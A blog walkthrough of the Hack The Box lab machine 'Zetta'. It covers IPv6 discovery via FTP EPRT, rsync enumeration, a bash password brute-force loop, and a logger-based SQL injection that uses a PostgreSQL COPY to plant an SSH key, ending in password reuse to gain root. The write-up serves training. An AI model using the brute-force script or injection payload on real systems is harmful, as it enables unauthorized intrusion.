---
layout: single
title: Zetta - Hack The Box
excerpt: "Zetta is another amazing box by [jkr](https://twitter.com/ateamjkr). The first part was kinda tricky because you had to pay attention to the details on the webpage and spot the references to IPv6 that lead you to the EPTR command to disclose the IPv6 address of the server. Then there's some light bruteforcing of rsync's credentials with a custom bruteforce script and finally a really cool SQL injection in a syslog PostgreSQL module."
date: 2020-02-22
classes: wide
header:
  teaser: /assets/images/htb-writeup-zetta/zetta_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - ipv6
  - rsync
  - sqli
  - postgresql
---

![](/assets/images/htb-writeup-zetta/zetta_logo.png)

Zetta is another amazing box by [jkr](https://twitter.com/ateamjkr). The first part was kinda tricky because you had to pay attention to the details on the webpage and spot the references to IPv6 that lead you to the EPTR command to disclose the IPv6 address of the server. Then there's some light bruteforcing of rsync's credentials with a custom bruteforce script and finally a really cool SQL injection in a syslog PostgreSQL module.

## Summary

- Obtain FTP credentials from the main webpage
- Disclose the IPv6 address of the server by using the `EPTR` command
- Find the rsync service available on IPv6 only
- Find a hidden module for `/etc` and recover the rsyncd.conf file
- Find another hidden module for `home_roy` and brute force the password
- Drop my SSH public key in `roy` home directory and get a shell
- Find `.tudu.xml` file containing a few hints
- Find the SQL query executed to insert syslog messages in the database and the syslog facility used to test the database
- Discover SQL injection in the query and use stacked query to write my SSH public key to PostgreSQL home directory
- SSH in as postgres and view the psql history file to find the postgres user password
- Find that the root password is based on the postgres password and the hint from the todo file (password scheme)

### Portscan

![](/assets/images/htb-writeup-zetta/nmap.png)

### First pass at checking the FTP site

I can't log in as anonymous on the FTP site:

![](/assets/images/htb-writeup-zetta/ftp1.png)

### Zetta website

The website is a generic company website without any dynamic components. Everything is static on this page and the contact form is not functional since it points to the anchor.

![](/assets/images/htb-writeup-zetta/web1.png)

In the services section, it mentions that they support native FTP and FXP, as well as RFC2428. RFC2428 describes the standard for *FTP Extensions for IPv6 and NATs*.

![](/assets/images/htb-writeup-zetta/web2.png)

Further down on the page there are FTP credentials shown in cleartext:

![](/assets/images/htb-writeup-zetta/web3.png)

Username: `O5Pnd3a9I8rt6h9gL6DUWhv1kwpV2Jff`
Password: `O5Pnd3a9I8rt6h9gL6DUWhv1kwpV2Jff`

### Disclosing the server IPv6 address

I can log in to the FTP server with the credentials from the page but I don't see any files or anything interesting.

![](/assets/images/htb-writeup-zetta/ftp2.png)

I remember from the main page that the server supports IPv6 but I don't have the IPv6 address. I could find the IP by pinging the box from another one on the same LAN calculating the IPv6 based based on the MAC address but instead I will use the `EPRT` command to force a connection back to my machine over IPv6 and find the source IP.

According to [https://tools.ietf.org/html/rfc2428](https://tools.ietf.org/html/rfc2428):

```
   The following are sample EPRT commands:

        EPRT |1|132.235.1.2|6275|

        EPRT |2|1080::8:800:200C:417A|5282|
```

![](/assets/images/htb-writeup-zetta/ftp3.png)

I recovered the IPv6 address: `dead:beef::250:56ff:feb2:9d22`

### Portscanning IPv6

I'll add the address to my local hostfile and then portscan the IPv6 address:

![](/assets/images/htb-writeup-zetta/nmap2.png)

So there's an rsync service running on port 8730.

### Rsync enumeration

I'll list the available modules with `rsync rsync://zetta.htb:8730`:

![](/assets/images/htb-writeup-zetta/rsync1.png)

I tried all modules in the list but I get unauthorized access every time:

![](/assets/images/htb-writeup-zetta/rsync2.png)

I tried a couple of directories that are not in the list and was able to access `/etc/`:

![](/assets/images/htb-writeup-zetta/rsync3.png)

I'll just sync all the files to my local machine so I can examine them:

![](/assets/images/htb-writeup-zetta/rsync4.png)

The `rsyncd.conf` file locks down access to the various directories shown in the list and only allows access from `104.24.0.54`:

```
[...]
# Allow backup server to backup /opt
[opt]
	comment = Backup access to /opt
	path = /opt
	# Allow access from backup server only.
	hosts allow = 104.24.0.54
[...]
```
However at the bottom there is a module that I haven't found before:

```
# Syncable home directory for .dot file sync for me.
# NOTE: Need to get this into GitHub repository and use git for sync.
[home_roy]
	path = /home/roy
	read only = no
	# Authenticate user for security reasons.
	uid = roy
	gid = roy
	auth users = roy
	secrets file = /etc/rsyncd.secrets
	# Hide home module so that no one tries to access it.
	list = false
```

Unfortunately I can't get access to the secrets file `/etc/rsyncd.secrets`:

```
root@kali:~/htb/zetta/tmp# rsync rsync://zetta.htb:8730/etc/rsyncd.secrets .
[]...]
rsync: send_files failed to open "/rsyncd.secrets" (in etc): Permission denied (13)
rsync error: some files/attrs were not transferred (see previous errors) (code 23) at main.c(1677) [generator=3.1.3]
```

I'll try to bruteforce the password by using a simple bash loop. I use the `sshpass` program to pass the password to the interactive logon:

```sh
#!/bin/bash

for p in $(cat /opt/SecLists/Passwords/Leaked-Databases/rockyou-10.txt)
do
    sshpass -p $p rsync -q rsync://roy@zetta.htb:8730/home_roy
    if [[ $? -eq 0 ]]
    then
        echo "Found password: $p"
        exit
    fi
done
```

After a few seconds I'm able to recover the password: `computer`

![](/assets/images/htb-writeup-zetta/brute.png)

### Getting a shell

The password works and I can access roy's home directory:

![](/assets/images/htb-writeup-zetta/shell1.png)

The password `computer` doesn't work over SSH (since rsync uses a separate authentication database), but I can just upload my SSH keys and then SSH in.

![](/assets/images/htb-writeup-zetta/shell2.png)

### Privesc

The home directory contains a data file for the `tudu` application:

> TuDu is a commandline tool to manage hierarchical TODO lists, so that you can organize everything you have to do in a simple and efficient way. It does not use any database backend, but plain XML files.

![](/assets/images/htb-writeup-zetta/root1.png)

The tudu file contains a couple of hints:

![](/assets/images/htb-writeup-zetta/root2.png)

![](/assets/images/htb-writeup-zetta/root3.png)

![](/assets/images/htb-writeup-zetta/root4.png)

- There is a shared password scheme used, this could be useful later when I find more credentials
- The syslog events are pushed to a PostgreSQL database
- There's a reference to a git dotfile

Looking around the box, I find a few git repos:

```
roy@zetta:~$ find / -type d -name .git 2>/dev/null
/etc/pure-ftpd/.git
/etc/nginx/.git
/etc/rsyslog.d/.git
```

The repos for pure-ftpd and nginx are not very interesting, but the rsyslog one has a few hints in the last commit:

![](/assets/images/htb-writeup-zetta/root5.png)

- There's a template configured to insert the syslog message into the syslog_lines table
- The database credentials are shown below
- There's a comment about using `local7.info` for testing

I tried logging in with the credentials but they didn't work. I think this is because the file has been edited but not committed to the git repo yet. I can't read the `pgsql.conf` file so I don't have the latest credentials.

![](/assets/images/htb-writeup-zetta/root6.png)

The log files in `/var/log/postgresql` contain error logs related to PostgreSQL:

![](/assets/images/htb-writeup-zetta/root7.png)

Based on the hint in the git commit, I can use `local7.info` to send syslog messages into the database. I see that I can trigger an error by using a single quote:

![](/assets/images/htb-writeup-zetta/root8.png)

Even though the template escapes the single quotes to `\'`, it still presents an SQL injection vector. I can't just close the single quote and do a stacked query because the insert expects two values. So what I'll do is insert the right values using `$$` as replacement for single quotes, then issue a 2nd command using `COPY` to deliver my SSH public key in the `postgres` home directory:

`logger -p local7.info "', \$\$2019-08-31 23:37:22\$\$); copy (select \$\$SSH_KEY_CONTENTS\$\$) to \$\$/var/lib/postgresql/.ssh/authorized_keys\$\$ --; "`

![](/assets/images/htb-writeup-zetta/root9.png)

After looking around for a while I find the `postgres` password in the psql history file: `sup3rs3cur3p4ass`:

```
postgres@zetta:~$ cat /var/lib/postgresql/.psql_history
CREATE DATABASE syslog;
\c syslog
CREATE TABLE syslog_lines ( ID serial not null primary key, CustomerID bigint, ReceivedAt timestamp without time zone NULL, DeviceReportedTime timestamp without time zone NULL, Facility smallint NULL, Priority smallint NULL, FromHost varchar(60) NULL, Message text, NTSeverity int NULL, Importance int NULL, EventSource varchar(60), EventUser varchar(60) NULL, EventCategory int NULL, EventID int NULL, EventBinaryData text NULL, MaxAvailable int NULL, CurrUsage int NULL, MinUsage int NULL, MaxUsage int NULL, InfoUnitID int NULL , SysLogTag varchar(60), EventLogType varchar(60), GenericFileName VarChar(60), SystemID int NULL);
\d syslog_lines
ALTER USER postgres WITH PASSWORD 'sup3rs3cur3p4ass@postgres';
```

There was a hint in the tudu file about a shared password scheme. The password scheme is `<secret>@userid` so I'll try `sup3rs3cur3p4ass@root` and see if I can su to root:

![](/assets/images/htb-writeup-zetta/root.png)